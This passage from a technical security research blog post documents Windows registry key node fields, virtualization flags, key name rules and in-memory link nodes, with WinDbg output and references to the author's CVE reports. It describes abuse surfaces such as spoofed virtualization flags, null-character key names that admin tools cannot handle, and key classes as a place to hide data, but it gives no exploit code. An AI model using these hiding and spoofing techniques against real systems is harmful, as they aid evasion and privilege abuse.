| 0x0020 | KEY\_COMP\_NAME | Indicates that the name of the key consists of ASCII characters only, and thus it has been "compressed" to fit two 8-bit characters in each of the 16-bit wide characters of \_CM\_KEY\_NODE.Name. This optimization aims to save storage space and memory, especially as a great majority of keys have simple, alphanumeric names. This flag can be set on virtually every key in the registry, and indeed, it is by far the most commonly used one. |
| 0x0040 | KEY\_PREDEF\_HANDLE | (Deprecated) The flag used to indicate that the key was a "predefined-handle key", which was a special kind of a symbolic link. The name refers to [Predefined Keys](https://learn.microsoft.com/en-us/windows/win32/sysinfo/predefined-keys), a set of top-level keys such as HKLM or HKCU recognized by the Win32 API. Keys with the KEY\_PREDEF\_HANDLE flag set allowed the system to redirect certain keys to chosen 32-bit HKEY pseudo-handles, and were specifically introduced in Windows NT 3.5 in 1994 for the purpose of redirecting two system keys related to [reading performance data through the registry](https://learn.microsoft.com/en-us/windows/win32/perfctrs/using-the-registry-functions-to-consume-counter-data):   * HKLM\Software\Microsoft\Windows NT\CurrentVersion\Perflib\009 → HKEY\_PERFORMANCE\_TEXT * HKLM\Software\Microsoft\Windows NT\CurrentVersion\Perflib\CurrentLanguage → HKEY\_PERFORMANCE\_NLSTEXT   Contrary to regular symbolic links, predefined keys re-purposed parts of the key node structure (specifically the value list length) to store the link destination, instead of using higher-level features of the format (such as the "SymbolicLinkValue" which is otherwise a perfectly normal value associated with a key). Such a change in semantics required a significant amount of special handling of predefined keys, which were not supposed to be operated on other than being opened. This, in turn, led to a number of security vulnerabilities related to the feature. For a detailed case study of one of them, CVE-2023-35633, see my [Windows Registry Deja Vu: The Return of Confused Deputies](https://j00ru.vexillium.org/talks/confidence-windows-registry-deja-vu-the-return-of-confused-deputies/) talk from CONFidence 2024.  As recently as 2023, all keys other than hive roots could be predefined keys, provided that they had been manually crafted in a binary controlled hive, because there was otherwise no supported way to create them via API. As a consequence of my reports, the feature was deprecated completely in July 2023 for Windows 10 1607+ and 11, and in December 2023 for older systems. At the time of this writing, the only two predefined keys left in existence are the original "009" and "CurrentLanguage" ones, and all other such keys are transparently converted to normal keys during hive load. |

Furthermore, there are also three flags related to [Registry Virtualization](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-virtualization), which was introduced in Windows Vista and is supported up to and including Windows 11:

| Mask | Name | Description |
| --- | --- | --- |
| 0x0080 | VirtualSource | Indicates that the key has been subject to virtualization, i.e. that it has a counterpart in the virtual store subtree. It is typically set on keys inside HKLM\Software which have been attempted to be opened with write access by a program running as a non-administrator. |
| 0x0100 | VirtualTarget | Indicates that the key is a virtual replica of a key in a global system hive that has been subject to virtualization. It is typically set on keys inside HKU\<SID>\_Classes\VirtualStore that have been created as a result of virtualization. It can only be set if VirtualStore (0x200) is set on the key, too. |
| 0x0200 | VirtualStore | Indicates that the key is part of the virtual store registry subtree, typically HKU\<SID>\_Classes\VirtualStore and its subkeys. It means that new virtualization targets may be created inside the key, but it itself isn't necessarily a virtual key (unless the VirtualTarget flag is also set). |

As we can see, the purpose of these flags is to keep track of the virtualization state of each key. Given that they express the internal state of the key and are intended to be modified by the kernel only, there doesn't seem to be a good reason to allow user-mode clients to modify the flags on demand. But in practice, unprivileged users have a lot of control over them: programs may arbitrarily set them in hives loaded from disk that they control (app hives and the user hive), and they may also set and clear them at runtime with the NtSetInformationKey(KeySetVirtualizationInformation) system call, as long as they are granted KEY\_SET\_VALUE access to the key. This makes it effectively possible to "spoof" virtual source/target/store keys, and opens up all of the registry virtualization code for potential abuse by unprivileged users. This has led to the discovery of multiple bugs directly related to virtualization: [CVE-2015-0073](https://project-zero.issues.chromium.org/issues/42451263) and [CVE-2019-0881](https://project-zero.issues.chromium.org/issues/42450862) by James Forshaw, and [several more](https://project-zero.issues.chromium.org/issues?q%3Did:(42451475%2520%257C%252042451502%2520%257C%252042451512%2520%257C%252042451515%2520%257C%252042451516%2520%257C%252042451527%2520%257C%252042451589%2520%257C%252042451627)) as part of my recent research.

##### LastWriteTime

This is yet another timestamp, in this case tracked on a key-granularity level. I assume it may be an interesting artifact for purposes of digital forensics, but otherwise it doesn't seem particularly security-relevant. One thing of note is that this information is very easy to query at runtime, as it is returned by the [RegQueryInfoKey](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryinfokeyw) API, and is also a part of the output structures of numerous [key information classes](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ne-wdm-_key_information_class) that can be queried via the NtQueryKey system call.

##### AccessBits

While theoretically an 8-bit field, this is effectively a 2-bit bitmask introduced in Windows 8 as part of the hive reorganization logic described earlier. It tracks the system phase(s) in which the key has been accessed: 0x0 if not accessed at all, 0x1 if accessed during boot, and 0x2 if accessed during normal system operation. This information is then used during reorganization to allocate key nodes with similar access bits close together.

##### LayerSemantics

This member is a 2-bit enum, used exclusively in hive version 1.6, which corresponds to differencing hives (also known as delta hives). Differencing hives are closely related to containerization support, and their purpose is to be overlaid on another hive in the system rather than being mounted as a standalone hive. For this reason, every key in a differencing hive is in one of four states, which indicate how the key should be interpreted in relation to the keys below it (i.e. the corresponding keys in lower-layer hives).

These four states are:

* Merge-Backed (0): the properties of the key are meant to be merged with the properties of the underlying keys in the key stack.
* Tombstone (1): the key is deleted at the current level, so none of the keys below it should be considered.
* Supersede-Local (2): the properties of the key fully supersede any state in the key stack below it: only values associated with that level (and any upper layers) are visible to the user.
* Supersede-Tree (3): same as Supersede-Local, but it applies to the key itself and recursively to all of its subkeys.

There is also an additional, implicit state called Merge-Unbacked, used to describe keys that don't exist in a hive at a given level, and so they simply fall through to the state represented by keys in the lower layers. Overall, layer semantics play a crucial role in the functionality of layered keys and differencing hives, and their correct handling in the registry implementation is paramount to system security and stability. Unfortunately, the feature is too complex to thoroughly discuss here, but there are some excellent resources on the subject: Microsoft's [Containerized Configuration](https://patents.google.com/patent/US20170279678A1/en) (US20170279678A1) patent, Maxim Suhanov's [Containerized registry hives in Windows](https://dfir.ru/2020/08/15/containerized-registry-hives-in-windows/) blog post, and the "Registry virtualization" section in Chapter 10 of the Windows Internals 7 (Part 2) book.

##### InheritClass

This bit is also related to layered keys, and it indicates whether the key inherits the class value from its counterparts lower in the key stack, or defines its own (or lack thereof).

##### Parent

The field identifies the key node that acts as this key's parent within the registry's hierarchical structure. Except for root keys, which exist at the topmost level of a hive, every key must have a valid Parent field. This index plays a vital role in navigating the registry and modifying key relationships. For example, it's essential for determining a key's full path or ensuring correct alphabetical order when renaming a key within its parent's subkey list.

##### SubKeyCounts

This two-element array of DWORDs stores the number of the key's stable and volatile subkeys, respectively. Even though the integers are 32 bits wide, the actual number of subkeys is limited by the upper bound of all keys in a hive in a specific storage space, which is roughly 2 GiB (storage space size) ÷ 84 bytes (minimum key node size) ≈ 25.5 million keys.

The data in this field is somewhat redundant, as the same information is also stored in the subkey indexes themselves. Nevertheless, the cached numbers stored directly in the key node make it possible to efficiently query the numbers of subkeys with API such as [RegQueryInfoKey](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryinfokeya). The kernel does its best to keep the two copies of the information in sync, and any discrepancies between them may lead to memory corruption vulnerabilities.

##### SubKeyLists

This is another two-element array, which complements the previous SubKeyCounts member by providing cell indexes to the corresponding subkey lists for each storage type. The format of these lists is discussed in detail in the "Subkey indexes" section below; for now, it's only important to know that if SubKeyCounts[x] > 0, then SubKeyLists[x] is expected to be a valid cell index, otherwise it should be equal to HCELL\_NIL (-1). Furthermore, because the volatile space is a strictly in-memory concept that doesn't exist on disk, newly loaded hives are always expected to have SubKeyCounts[1] set to 0 and SubKeyLists[1] set to HCELL\_NIL.

##### ValueList

This is a structure of type \_CHILD\_LIST, which consists of two 32-bit integers: the number of values associated with the key, and a cell index of the actual value list. Here, there is no distinction between stable and volatile values: for any given key, the values always inherit the storage type of the key, so either all of them are stable, or all of them are volatile. Similarly to subkey lists, though, if ValueList.Count is 0, then ValueList.List must be HCELL\_NIL.

As mentioned earlier, this field also had a second meaning if the key was a predefined key: in that case, ValueList.Count contained an arbitrary value with the highest bit set, which indicated the top-level HKEY to redirect to, and ValueList.List was completely unused and could contain arbitrary data. As you can imagine, whenever an internal system function started to use such a value list with the assumption it was a normal key, it would operate on an inadequately huge count and an invalid cell index, wrecking havoc in the kernel. Thankfully, this is no longer a possibility due to the deprecation of predefined keys in 2023.

##### ChildHiveReference

You may have noticed that ChildHiveReference is part of a union, as it resides at the same offset as the SubKeyLists member (offset 0x1C). It is a special object that is used to implement hive mounting under the \Registry tree, and is unique to keys that have the KEY\_HIVE\_EXIT flag set (i.e. exit nodes). It is only ever used in memory, and is therefore not applicable to regular hives stored on disk. Its two fields specify the root key of the mounted hive, as a pair of a kernel pointer to the \_HHIVE descriptor structure and the cell index of the root key. This breaks the fundamental invariant that hives are self contained and don't store any virtual address pointers, only cell indexes. It is the only exception to the rule, and only because it is a necessary hack/workaround to implement a feature that hives normally don't support: attaching one hive to another in the global system view.

The field and its usage are discussed in more detail in the "Link nodes" section below.

##### Security

This is the cell index of the security descriptor cell corresponding to the key. It is a mandatory field for every type of key in the registry (symbolic links, previously predefined keys etc.), with the only exception being system-managed exit nodes. For every key that has an invalid security descriptor during hive load (e.g. set to HCELL\_NIL or just an invalid cell index), it is automatically fixed up to inherit the security descriptor of its parent key. If the root key of a hive has invalid security, the whole hive is rejected with the STATUS\_REGISTRY\_CORRUPT error code.

The security descriptor cell always has the same storage type as the key(s) that it is associated with. So for example, if there are two keys in a hive with the same security properties, one in the stable and the other in the volatile space, then they will reference two different stable/volatile security cells with equivalent data.

For obvious reasons, the correct handling of this field is crucial to overall system security. In the course of my research, I have discovered [9 vulnerabilities](https://project-zero.issues.chromium.org/issues?q%3Did:(42451423%2520%257C%252042451425%2520%257C%252042451427%2520%257C%252042451516%2520%257C%252042451552%2520%257C%252042451596%2520%257C%252042451592%2520%257C%252042451601%2520%257C%252042451625)) directly involving the handling of security descriptors, and a further 4 reported to Microsoft outside of the tracker (WinRegLowSeverityBugs [#1](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/01_Key_node_Security_OOB_read), [#10](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/10_CmpKeySecurityIncrementReferenceCount_zero_refcount_crash), [#13](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/13_CmpLightWeightPrepareSetSecDescUoW_security_list_confusion), [#20](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/20_App_hive_security_inconsistencies)). They generally didn't have much to do with the  \_CM\_KEY\_NODE.Security field specifically, but rather the formatting of the security cells and higher-level logic related to them:

* Binary formatting of the SECURITY\_DESCRIPTOR\_RELATIVE structure
* Maintaining the consistency of the doubly-linked list of security descriptors in the hive
* Reference counting security descriptors when operating on keys
* Enforcing proper access checks when opening and creating keys

Overall, this is probably the most interesting field in the structure from a security research perspective.

##### Class and ClassLength

In technical terms, a key class is an optional, immutable blob of 1-65535 bytes associated with a key. It can only be set once, during the creation of a key, through the lpClass argument of the [RegCreateKeyExW](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexw) API (or the equivalent Class parameter of the NtCreateKey system call). It can be then queried with functions such as [RegQueryInfoKey](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryinfokeyw), but cannot be modified without deleting and re-creating the key. If the class exists, then the ClassLength field is set accordingly, and Class is a cell index that points to its backing buffer. Otherwise, ClassLength is set to 0 and Class is HCELL\_NIL (-1).

Conceptually, a class can be viewed as an extra, hidden value of a key, existing alongside the normal value list. It is not displayed anywhere in the Regedit GUI, but if it exists for a given key, it can be retrieved by using the "Export" option in Regedit to save the key to a .txt file, which also exports the class data. It has existed since the earliest version 1.0 of the regf format – perhaps as a way to store the "type" of a key similar to how every value has a defined type. Today, it seems to be a mostly obsolete mechanism that doesn't see much use; even Raymond Chen wrote in his [What is the terminology for describing the various parts of the registry?](https://devblogs.microsoft.com/oldnewthing/20090204-00/?p%3D19263) blog in 2009:

| Bonus chatter: There’s also this thing called a class. I have no idea what it’s for, so don’t ask. |
| --- |

When I ran a quick scan of the Windows 11 registry, I found the following unique strings being used at least once as a key class:

* "DynDRootClass"
* "GenericClass"
* "Network ComputerName"
* "REG\_SZ"
* "Shell"

The [Windows NT Registry File (REGF) format specification](https://github.com/libyal/libregf/blob/main/documentation/Windows%2520NT%2520Registry%2520File%2520%28REGF%29%2520format.asciidoc) lists several other values that have been observed in the past, such as "activeds.dll ", "Cygwin", "OS2SS" or "TCPMon". It is worth noting that the class was also used to store the encryption keys for the now-deprecated SAM database encryption mechanism known as [SysKey](https://moyix.blogspot.com/2008/02/syskey-and-sam.html). Overall, due to its simplistic nature, key classes are not particularly security-relevant, but may be of interest in the context of obfuscation and hiding data, as they are easily accessible and yet a largely overlooked part of the registry.

##### MaxNameLen, MaxClassLen, MaxValueNameLen and MaxValueDataLen

These four fields store cached information about the maximum lengths of several properties of the key or its subkeys:

* MaxNameLen: the maximum length of a subkey's name,
* MaxClassLen: the maximum length of a subkey's class information,
* MaxValueNameLen: the maximum length of a value name associated with the key,
* MaxValueDataLen: the maximum length of a value data associated with the key.

The presumed purpose of these members is to facilitate a quick lookup of the per-key limits, such that when a client application wants to enumerate/query subkeys or values, it can simply allocate a single buffer guaranteed to accommodate every possible key name, value name, etc. And so, their exact values can be retrieved with the [RegQueryInfoKey](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryinfokeyw) API via the lpcbMaxSubKeyLen, lpcbMaxClassLen, lpcbMaxValueNameLen and lpcbMaxValueLen arguments.

Although querying these limits seems convenient, there are some caveats that are important to keep in mind:

* The fields are intended to represent the lower bound of the number of bytes required to store the given property, but not necessarily to be optimal (i.e. to be the smallest sufficient length). For example, when a key with formerly the longest name is deleted, the MaxNameLen field of the parent is not updated with the value of the second-largest length, as that would require the lengthy process of iterating through all of the subkeys again. Therefore, relying on those values may incur some unwanted memory overhead.
* When operating on registry keys that are globally visible in the registry tree, it is possible that a race condition with another application causes one of the maxima to change in between the RegQueryInfoKey call and the actual data query. To address this, applications should include fallback logic to allocate more memory in the rare case when the obtained maximum proves insufficient.
* To add to the previous point, after having reverse-engineered and reviewed most of the Configuration Manager code, it is my instinct that these fields continue to be supported throughout the development of new registry features (e.g. differencing hives), but it is mostly on a best-effort basis. For example, during hive load, only MaxValueNameLen and MaxValueDataLen are enforced to have the correct values, while MaxNameLen and MaxClassLen remain unchecked. For this reason, I would personally not rely on the consistency of those values for the security of any client code, and would treat them more as a guidance/supplementary information than the sole source of truth about the key limits.

##### UserFlags

This is a field whose name, offset and function (so basically every aspect) has been subject to change over the years. Its current form has existed since Windows Vista, and occupies bits 20-23 of MaxNameLen, which had been previously a 32-bit integer, but was later reduced to 16 bits to make room for these extra flags. In theory, its name may suggest that this member is meant to store user-defined data, but in practice, Microsoft developers quickly found their own use for the bitmask: storing flags related to the [Registry Reflection](https://learn.microsoft.com/en-us/windows/win32/winprog64/registry-reflection) mechanism for providing interoperability between 32-bit and 64-bit applications. You can read more about the meaning of each specific flag [here](https://github.com/msuhanov/regf/blob/master/Windows%2520registry%2520file%2520format%2520specification.md%23user-flags), but in short, this was where reflection-specific configuration was internally saved by API functions such as [RegEnableReflectionKey](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regenablereflectionkey) and [RegDisableReflectionKey](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regdisablereflectionkey), and retrieved by [RegQueryReflectionKey](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryreflectionkey).

However, this specific use seems to have been short-lived, as Registry Reflection [was soon deprecated](https://learn.microsoft.com/en-us/windows/win32/win7appqual/removal-of-windows-registry-reflection) in Windows 7. Since then, it could indeed be considered as four extra bits of user-controlled storage per key, accessible for reading via NtQueryKey(KeyFlagsInformation) and for writing via NtSetInformationKey(KeyWow64FlagsInformation). Beyond being interesting for historical reasons, the field doesn't play any important role in security.

##### VirtControlFlags

This field is another one introduced around Windows XP SP3 / Windows Vista that took over some of the space from MaxNameLen. It is related to Registry Virtualization and takes up four bits in the \_CM\_KEY\_NODE structure definition, but there are only three flags that it can really store:

| Mask | Name | Description |
| --- | --- | --- |
| 0x1 | REG\_KEY\_DONT\_VIRTUALIZE | Disables virtualization for the specific key. |
| 0x2 | REG\_KEY\_DONT\_SILENT\_FAIL | Prevents the system from re-opening a virtualized key with MAXIMUM\_ACCESS if the initial Open operation with the desired access rights has failed. |
| 0x4 | REG\_KEY\_RECURSE\_FLAG | Causes new subkeys of the key to inherit its virtualization-related configuration. |

The flags are not sanitized in any way during hive load and so may be set to arbitrary values. They can also be modified programmatically by using the NtSetInformationKey(KeySetVirtualizationInformation) system call, or even from the Windows command line, by using the REG FLAGS command:

C:\>reg flags /?

REG FLAGS KeyName [QUERY |

                   SET [DONT\_VIRTUALIZE] [DONT\_SILENT\_FAIL] [RECURSE\_FLAG]]

                  [/reg:32 | /reg:64]

  Keyname    "HKLM\Software"[\SubKey] (Restricted to these keys on

        local machine only).

    SubKey   The full name of a registry key under HKLM\Software.

  DONT\_VIRTUALIZE DONT\_SILENT\_FAIL RECURSE\_FLAG

    Used with SET; flags specified on the command line will be set,

        while those not specified will be cleared.

  /reg:32  Specifies the key should be accessed using the 32-bit registry view.

  /reg:64  Specifies the key should be accessed using the 64-bit registry view.

More information about these flags can be found in the documentation of the [ORSetVirtualFlags](https://learn.microsoft.com/en-us/windows/win32/devnotes/orsetvirtualflags) API function, a part of the Offline Registry Library. In the context of registry security research, I haven't found them particularly interesting – the other virtualization-related flags in the "Flags" field have proved to be much more useful in that regard.

##### Debug

In Debug/Checked builds of Windows, it used to be possible to have the kernel trigger a breakpoint when performing a specific operation on a specific registry key. To enable the option, an administrator would have to set the  HKLM\System\CurrentControlSet\Control\Session Manager\Configuration Manager\RegDebugBreaksEnabled value to 1, which would propagate to the global kernel CmpRegDebugBreakEnabled variable. Then, the "Debug" field of each key would store a bitmask indicating which subset of eight possible operations should be interrupted for the given key:

| Mask | Name |
| --- | --- |
| 0x01 | BREAK\_ON\_OPEN |
| 0x02 | BREAK\_ON\_DELETE |
| 0x04 | BREAK\_ON\_SECURITY\_CHANGE |
| 0x08 | BREAK\_ON\_CREATE\_SUBKEY |
| 0x10 | BREAK\_ON\_DELETE\_SUBKEY |
| 0x20 | BREAK\_ON\_SET\_VALUE |
| 0x40 | BREAK\_ON\_DELETE\_VALUE |
| 0x80 | BREAK\_ON\_KEY\_VIRTUALIZE |

Whenever a breakpoint was triggered by this mechanism, the kernel would also print out a corresponding message for the attached debugger, for instance:

DbgPrint("\n\n Current process is deleting a key tagged as BREAK ON DELETE");

DbgPrint(" or deleting a subkey under a key tagged as BREAK\_ON\_DELETE\_SUBKEY\n");

DbgPrint("\nPlease type the following in the debugger window: !reg kcb %p\n\n\n", Kcb);

Now that the Debug/Checked builds have been discontinued – or at least not released publicly anymore for the latest versions of Windows 10/11 – the "Debug" field is just an unused byte in the key node structure.

##### WorkVar

According to an unofficial format specification, WorkVar used to be an internal-use member meant to be only ever accessed by the kernel in order to optimize key lookups. The last version of Windows where WorkVar was still in active use was Windows 2000; since Windows XP, it has simply been another four bytes of unused memory in the key node data layout.

##### NameLength and Name

The combination of these two fields specifies the name of the key: NameLength indicates the length of the string in bytes, and Name is an inline, variable-length buffer at the end of the structure that stores the name itself. There are a number of considerations and consistency requirements related to registry key names, enforced when loading a hive and later at runtime:

* Compression: If the KEY\_COMP\_NAME (0x20) flag is clear in \_CM\_KEY\_NODE.Flags, the name is formatted as a wide string of 16-bit characters. If it is set, which is the common scenario, then "Name" represents a more tightly packed ASCII string of 8-bit characters. Considering that a majority of keys in the registry are alphanumeric, this optimization saves a non-trivial amount of memory and disk space. It is interesting to note that it is still possible to load a hive with a non-optimally formatted key name (non-compressed ASCII string), but such a key node would never be generated by Windows itself.
* Length: The key name mustn't be empty (i.e. it should be at least one character long), and it cannot exceed 256 characters in length (even though [Registry element size limits](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-element-size-limits) incorrectly claims that the limit is 255). The NameLength field value is expressed in bytes, so it must be between 1-256 for compressed names, and 2-512 for wide strings (and divisible by two). Up until October 2022, this limit [was not correctly enforced](https://project-zero.issues.chromium.org/issues/42451478), making it possible to load hives with key names up to 1040 characters, which would then be mishandled or outright rejected by other parts of the registry code.
* Charset: All characters in the 0x0000 – 0xFFFF range are allowed in a key name with the exception of backslash ('\', 0x005C). The backslash is singled out because it plays a special role in the registry, separating distinct elements of the registry paths. Since the kernel must always be able to distinguish parts of key names from the separator, a decision was made to exclude this one character from the key name charset, similar to how backslashes are not allowed in file names. Furthermore, there is a second minor requirement that the key name must not start with a null character, but it may be present at any other position in the name (this only started to be properly enforced in NtRenameKey after the fix for [CVE-2024-26178](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/13_CmpLightWeightPrepareSetSecDescUoW_security_list_confusion) in March 2024). Overall, this means that key names aren't truly textual strings in the conventional sense of the word: they don't use a terminator, and may contain all sorts of non-printable characters. It would be more appropriate to think of them as binary blobs used to reference registry keys, which doesn't have any consequences for the kernel, as it universally uses the UNICODE\_STRING structure that includes both the length and the backing buffer of the string anyway. But if a potentially malicious program were to create a key with an unusual name (e.g. including a null character), it could prove difficult for an administrator to operate on it with the built-in registry utilities (reg.exe, Regedit), or even with third-party tools that use the high-level API (such as [RegOpenKeyEx](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa)). In such cases, it might be required to use specialized tools that interact with the Windows registry directly through the system call interface as the only way to examine/modify such keys.
* Uniqueness: One of the most important invariants of the Windows registry implementation is the uniqueness of key names: there may be only one key with a specific path, or in other words, for every key, there mustn't be any duplicates in the list of its subkeys. Given that registry key names are case-insensitive, any two names are always compared in their uppercase form to determine if they are equal or not. This uniqueness requirement is enforced both during hive load and subsequent operations, and failure to do it correctly could lead to both logic bugs and memory corruption. For some examples of the potential outcomes of allowing duplicate key names in registry, see Maxim Suhanov's [The uppercased hell](https://dfir.ru/2021/10/15/the-uppercased-hell/) blog or my [CVE-2023-21748](https://project-zero.issues.chromium.org/issues/42451527) / [CVE-2023-23420](https://project-zero.issues.chromium.org/issues/42451549) bug reports.

Another intriguing aspect of the key names are the names associated with the root keys of default system hives. In general, every registry key in Windows is referenced by its name specified in the key node, except for root keys, which are known by the name of their mount points. As a result, the "real" underlying names of root keys are never visible to users or applications, but they are nevertheless present in the hive file as a mandatory part of every key node, and could be potentially used to learn something about how these fundamental system hives (SOFTWARE, SYSTEM etc.) are generated.

I have examined hives from various Windows versions ranging from Windows NT 3.1 to Windows 11, and arrived at the following list of per-version root key names:

| Version | Root key name |
| --- | --- |
| NT 3.1 - NT 4.0 | Same as the hive name (e.g., "SYSTEM") |
| 2000 - XP | $$$PROTO.HIV |
| Vista - 7 | CMI-CreateHive{RANDOM GUID} |
| 8 | CsiTool-CreateHive-{00000000-0000-0000-0000-000000000000} |
| 10 - 11 | ROOT |

In early NT versions, the root key name simply mirrored the hive's file name. In Windows 2000 and XP, the name stemmed from the fact that system hives were created during system installation by temporarily creating the tree root under \Registry\Machine\SYSTEM\$$$PROTO.HIV, pre-initializing it with the default data for the given hive, and saving it to a file with an API like [RegSaveKeyEx](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsavekeyexw).

In Windows 10 and 11, the name is simply "ROOT", which, along with the "OfRg" magic bytes at offset 0xB0 in the file header, hints that the hives are created with the Offline Registry Library. This leaves versions between Windows Vista and Windows 8 as the big unknown: neither "CMI-CreateHive" nor "CsiTool-CreateHive" sound particularly familiar, and I haven't been able to find any information about them in any public resources. It is probably safe to assume that these strings are indicative of some internal Microsoft tooling that was used to generate hives for these systems, but not much is known beyond it. Nevertheless, I find it fascinating that such little tidbits of information can be found in obscure corners of file formats. You never know when some other missing part of the puzzle becomes known publicly, making it possible to finally connect the dots and see the bigger picture, sometimes years or decades after the initial release of the software.

#### Link nodes

As mentioned above, link nodes are a special type of key node designed to facilitate the mounting of arbitrary hives from disk into the global registry view. They are managed by the Windows kernel and only ever exist in memory. They are represented by the \_CM\_KEY\_NODE structure, but with the following differences compared to regular keys:

* The Signature field is set to 0x6B6C ('lk') instead of 0x6B6E ('nk'),
* The KEY\_HIVE\_EXIT (0x0002) flag is set in Flags,
* The key doesn't have any of the standard key properties, such as the security descriptor, class, subkeys or values. The only cell reference it contains is to its parent cell, which is one of \Registry\A, \Registry\Machine, \Registry\User or \Registry\WC.
* Instead of the SubKeyLists member at offset 0x1C, the link node uses the ChildHiveReference field of type \_CM\_KEY\_REFERENCE, which stores a kernel-mode pointer to the destination hive descriptor (\_HHIVE\*), and the cell index of the root key within that hive.

So, whenever you see a hive root key (e.g. any key within HKLM or HKCU), you are actually looking at a pair of a link node (also known as exit node) + root key (a.k.a. entry node – these terms are used interchangeably). The mount point assumes the key name of the link node (so that it is easily enumerable with the existing kernel logic), and all of the characteristics of the entry node. This is illustrated in the following diagram, where the key marked in red is the link node of the SYSTEM hive, and the green one is the root key:

[![Diagrammatic illustration and visual representation of the paragraph above](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3oiXe3jfIDS0CKONQWJn0FeAugieby2gy41fGxDBO_dDqYh13EduspE8cuBTKWOikQfdPR7GodX7__1sUQIlqpsObXgtp_ucQenLFPZB1qf7Yoxy6EiIK8WzFa6IkDsBbHGhc5fRnFFtf0SSunqUPto67Kl73AD6pczCRNbjXbgvGNqhcRhcFR8iNFGk/s1200/image10.png "Diagrammatic illustration and visual representation of the paragraph above")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3oiXe3jfIDS0CKONQWJn0FeAugieby2gy41fGxDBO_dDqYh13EduspE8cuBTKWOikQfdPR7GodX7__1sUQIlqpsObXgtp_ucQenLFPZB1qf7Yoxy6EiIK8WzFa6IkDsBbHGhc5fRnFFtf0SSunqUPto67Kl73AD6pczCRNbjXbgvGNqhcRhcFR8iNFGk/s1999/image10.png)

The existence of link nodes seems to be very little known and scarcely documented in public resources, which is likely caused by the fact that the Windows kernel makes them virtually invisible, and not just for users and high-level API clients, but even for administrators and kernel driver developers. The way the registry tree traversing code is structured, whenever it encounters a link node, it always makes sure to skip over it and reference the corresponding entry node. This means that it is impossible to open or otherwise observe the link node itself from the context of user-mode, but if we put in some effort, we should be able to see it in WinDbg attached as a kernel debugger. We can approach the link node from two sides: either try to find it top-down starting from the master hive, or by locating a key in a mounted hive and traversing the registry tree upwards.

In this post, we will proceed with the first idea and enumerate the keys within \Registry\Machine (i.e. HKLM):

0: kd> !reg querykey \registry\machine

Found KCB = ffff800f88ad96e0 :: \REGISTRY\MACHINE

Hive         ffff800f88a88000

KeyNode      ffff800f88ada16c

[SubKeyAddr]         [SubKeyName]

ffff800f88ada44c     BCD00000000

ffff800f88ada3cc     HARDWARE

ffff800f88ada59c     SAM

ffff800f88ada504     SECURITY

ffff800f88ada374     SOFTWARE

ffff800f88ada31c     SYSTEM

 Use '!reg keyinfo ffff800f88a88000 <SubKeyAddr>' to dump the subkey details

[ValueType]         [ValueName]                   [ValueData]

REG\_DWORD           ServiceLastKnownStatus        2

Here, we can see all the system hive mount points together with their corresponding link node addresses. In case of normal, stable keys, these would be user-mode addresses within the address space of the Registry process, but since the master hive is a volatile one, all of its structures are stored on the kernel pools. We can then use a command such as !reg knode to query any of the specific subkeys, e.g. SYSTEM:

0: kd> !reg knode ffff800f88ada31c

Signature: CM\_LINK\_NODE\_SIGNATURE (kl)

Name                 : SYSTEM

ParentCell           : 0x168

Security             : 0xffffffff [cell index]

Class                : 0xffffffff [cell index]

Flags                : 0x2a

MaxNameLen           : 0x0

MaxClassLen          : 0x0

MaxValueNameLen      : 0x0

MaxValueDataLen      : 0x0

LastWriteTime        : 0x 1db2b94:0xe031a530

SubKeyCount[Stable  ]: 0x0

SubKeyLists[Stable  ]: 0x20

SubKeyCount[Volatile]: 0x0

SubKeyLists[Volatile]: 0xffffffff

ValueList.Count      : 0x88a8e000

ValueList.List       : 0xffff800f

As expected, the key node has the special link node signature ('kl'), and the 0x2 flag set within the 0x2a Flags bitmask (the other two flags set are KEY\_NO\_DELETE and KEY\_COMP\_NAME). The command gets a little confused, because it expects to operate on a regular key node and display its subkey/value counts and lists, but as mentioned above, this space is taken up by the \_CM\_KEY\_REFERENCE structure in the link node. If we line up the offsets correctly, we can decode that the exit node points at cell index 0x20 in hive 0xffff800f88a8e000, which is consistent with the outcome of displaying the structure data directly:

0: kd> dx -id 0,0,ffffbd044acf6040 -r1 (\*((ntkrnlmp!\_CM\_KEY\_REFERENCE \*)0xffff800f88ada338))

(\*((ntkrnlmp!\_CM\_KEY\_REFERENCE \*)0xffff800f88ada338))                 [Type: \_CM\_KEY\_REFERENCE]

    [+0x000] KeyCell          : 0x20 [Type: unsigned long]

    [+0x008] KeyHive          : 0xffff800f88a8e000 [Type: \_HHIVE \*]

We can now translate this information into the cell's virtual address, and take a peek into it with !reg knode and !reg keyinfo:

0: kd> !reg cellindex 0xffff800f88a8e000 0x20

Map = ffff800f88adc000 Type = 0 Table = 0 Block = 0 Offset = 20

MapTable     = ffff800f88ade000

MapEntry     = ffff800f88ade000

BinAddress = ffff800f896e8009, BlockOffset = 0000000000000000

BlockAddress = ffff800f896e8000

pcell:  ffff800f896e8024

0: kd> !reg knode ffff800f896e8024

Signature: CM\_KEY\_NODE\_SIGNATURE (kn)

Name                 : ROOT

ParentCell           : 0x318

Security             : 0x78 [cell index]

Class                : 0xffffffff [cell index]

Flags                : 0x2c

MaxNameLen           : 0x26

MaxClassLen          : 0x0

MaxValueNameLen      : 0x0

